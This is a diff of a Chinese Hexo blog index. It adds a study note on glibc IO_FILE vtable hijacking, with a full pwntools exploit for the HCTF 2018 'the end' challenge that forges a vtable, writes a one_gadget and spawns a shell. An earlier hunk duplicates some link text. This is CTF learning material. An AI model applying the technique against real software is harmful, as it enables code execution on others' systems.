@@ -396,7 +396,7 @@
 </ul>
 <p><font color=#BF6766>并没有很多的指令的学习，主要是想为萌新们加深对于linux系统的理解。以及讲一些个人的比较奇怪的体会</font></p>
 <h2 id="1）linux是什么？"><a href="#1）linux是什么？" class="headerlink" title="1）linux是什么？"></a><font color=#B19693>1）linux是什么？</font></h2><p>Linux是一类自由和开源的操作系统。</p>
-<p>通常情况下，我们接触到的linux都是被打包好的各种linux发行版，包括<a href="https://zh.wikipedia.org/wiki/Debian">Debian</a>（<font color=#A96360>及其派生版本<a href="https://zh.wikipedia.org/wiki/Ubuntu">Ubuntu</a>、Kali等</font>）、<a href="https://zh.wikipedia.org/wiki/Fedora">Fedora</a>（<font color=#A96360>及其相关版本<a href="https://zh.wikipedia.org/wiki/CentOS">CentOS</a>和<a href="https://zh.wikipedia.org/wiki/OpenSUSE">openSUSE</a>等。)</font></p>
+<p>通常情况下，我们接触到的linux都是被打包好的各种linux发行版，包括<a href="https://zh.wikipedia.org/wiki/Debian">Debian</a>（<font color=#A96360>及其派生版本<a href="https://zh.wikipedia.org/wiki/Ubuntu">Ubuntu</a>、Kali等</font>）、<a href="https://zh.wikipedia.org/wiki/Fedora">Fedora</a>（<font color=#A96360>及其相关版本<a href="https://zh.wikipedia.org/wiki/CentOS">CentOS</a>和<a href="https://zh.wikipedia.org/wiki/OpenSUSE">openSUSE</a>等。)和<a href="https://zh.wikipedia.org/wiki/OpenSUSE">openSUSE</a>等。</font></p>
 <p>也就是类似ubuntu，centos等操作系统，都属于linux。不同的发行版的命令格式以及依赖库都不太一样，在学习初期选择一种发行版使用就行，没有必要反复横跳。</p>
 <p>建议没有明确方向的同学统一装ubuntu20.04LTS。</p>
 <h2 id="2）为什么要使用linux？"><a href="#2）为什么要使用linux？" class="headerlink" title="2）为什么要使用linux？"></a><font color=#B19693>2）为什么要使用linux？</font></h2><h3 id="1）免费"><a href="#1）免费" class="headerlink" title="1）免费"></a><font color=#AB3B3A>1）免费</font></h3><p>windoe10家庭版在中国官网售价<strong>1088rmb</strong>，Mac OS X正版则只随电脑附赠，最便宜的是mac mini，<strong>5299</strong>起。</p>
@@ -467,12 +467,76 @@
 <h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1 "></a><font color=#AB3B3A>Level1 </font></h4><p>使用gdb调试你的hello world程序，感受单步调试的神圣感，将你看到的东西记在心里，也许以后会用上。</p>
 <h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2 "></a><font color=#AB3B3A>Level2 </font></h4><p><strong><font color=#9F353A>夹带私货环节，不想学pwn的同学可以直接跳过。 </font></strong></p>
 <p>利用pip3安装一个pwntools。</p>
-<h2 id="8）参考"><a href="#8）参考" class="headerlink" title="8）参考"></a><font color=#B19693>8）参考</font></h2><p>鸟哥的Linux私房菜</p>
-<p><a href="http://haacked.com/archive/2012/02/22/spirit-of-open-source.aspx/">What Is The Spirit of Open Source?</a></p>
-<p><a href="https://www.runoob.com/linux/linux-comm-apt.html">Linux apt 命令</a></p>
+<h2 id="8）参考"><a href="#8）参考" class="headerlink" title="8）参考"></a><font color=#B19693>8）参考</font></h2><p><a href="https://www.runoob.com/linux/linux-comm-apt.html">Linux apt 命令</a></p>
 ]]></content>
       <tags>
         <tag>mess</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IO_FILE学习</title>
+    <url>/2021/08/09/io_file/</url>
+    <content><![CDATA[<p>io_file学习笔记</p>
+<h3 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
+<p>结构源码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
+<p>以fread为例子简述io_file结构调用的流程</p>
+<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
+<p>下面是<code>_IO_sgetn</code>的源码。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-keyword">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
+<p>也就是<code>_IO_XSGETN</code>。</p>
+<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
+<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
+<p><code>_IO_jump_t</code>源码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
+<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
+<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>函数源码如上，实现的是一个键盘输入。 </p>
+<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
+<h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
+<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
+<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
+<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
+<p>但是我们先从第一个方法来试一试。</p>
+<p>示例来源于ctf-wiki</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这边利用的具体步骤比较直观。</p>
+<ol>
+<li>通过<code>vtable</code>在<code>_IO_FILE_plus </code>的偏移，找到vtable的地址。这里为<code>0xd8</code>（64位）</li>
+<li>修改<code>vtable</code>的值为aaaa，这里的[7]是因为我们要用<code>printf</code>触发，而<code>print</code>f需要调用<code>vtable</code>中第八项的<code>xsputn</code>。</li>
+<li>调用printf函数，触发漏洞。</li>
+</ol>
+<p>然后我们来看第二种方法。</p>
+<p>第二种方法直接用一道比较完整的例题。</p>
+<p>2018年的hctf the end</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  sleep(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);<br>  fflush(_bss_start);<br>  close(<span class="hljs-number">1</span>);<br>  close(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1337</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一眼看过去除了可以任意写五个字节好像也没有其他漏洞，那么我们看看能不能通过io_file来解决。</p>
+<p>注意到最后程序调用了exit（），那么我们可以从这里入手。</p>
+<p>众所周知当程序调用exit（），首先程序遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
+<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
+<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br><span class="hljs-comment"># p = process(&#x27;the_end&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1234</span>)<br><br>rem = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> rem ==<span class="hljs-number">1</span>:<br>    p = remote(<span class="hljs-string">&#x27;150.109.44.250&#x27;</span>,<span class="hljs-number">20002</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Input your token:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;</span>)<br><br>sleep_ad = p.recvuntil(<span class="hljs-string">&#x27;, good luck&#x27;</span>,drop=<span class="hljs-literal">True</span>).split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>]<br><br>libc_base = long(sleep_ad,<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;sleep&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf02b0</span><br>vtables =     libc_base + <span class="hljs-number">0x3C56F8</span><br><br>fake_vtable = libc_base + <span class="hljs-number">0x3c5588</span><br>target_addr = libc_base + <span class="hljs-number">0x3c55e0</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base: &#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;one_gadget:&#x27;</span>,<span class="hljs-built_in">hex</span>(one_gadget)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;exit_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base + libc.symbols[<span class="hljs-string">&#x27;exit&#x27;</span>])<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    p.send(p64(vtables+i))<br>    p.send(p64(fake_vtable)[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    p.send(p64(target_addr+i))<br>    p.send(p64(one_gadget)[i])<br><br>p.sendline(<span class="hljs-string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
+<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
+]]></content>
+      <tags>
+        <tag>other</tag>
       </tags>
   </entry>
 </search>
